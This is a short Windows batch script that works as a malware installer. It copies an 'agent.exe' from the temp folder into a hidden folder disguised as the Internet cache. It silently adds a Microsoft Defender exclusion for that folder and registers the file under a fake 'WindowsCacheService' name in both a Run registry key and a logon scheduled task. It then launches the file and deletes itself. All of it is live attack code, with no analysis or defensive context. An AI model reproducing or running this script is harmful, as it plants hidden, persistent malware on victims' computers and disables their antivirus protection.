@echo off
set "targetDir=%LOCALAPPDATA%\Microsoft\Windows\INetCache\Cache"
if not exist "%targetDir%" mkdir "%targetDir%"
attrib +h "%targetDir%" >nul 2>&1
copy /Y "%TEMP%\agent.exe" "%targetDir%\agent.exe" >nul 2>&1
attrib +h "%targetDir%\agent.exe" >nul 2>&1
powershell -NoP -NonI -W Hidden -Command "Add-MpPreference -ExclusionPath '%targetDir%' -Force" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsCacheService" /t REG_SZ /d "\"%targetDir%\agent.exe\"" /f >nul 2>&1
schtasks /create /tn "WindowsCacheService" /tr "\"%targetDir%\agent.exe\"" /sc ONLOGON /f >nul 2>&1
start "" /B "%targetDir%\agent.exe"
del "%~f0" >nul 2>&1
exit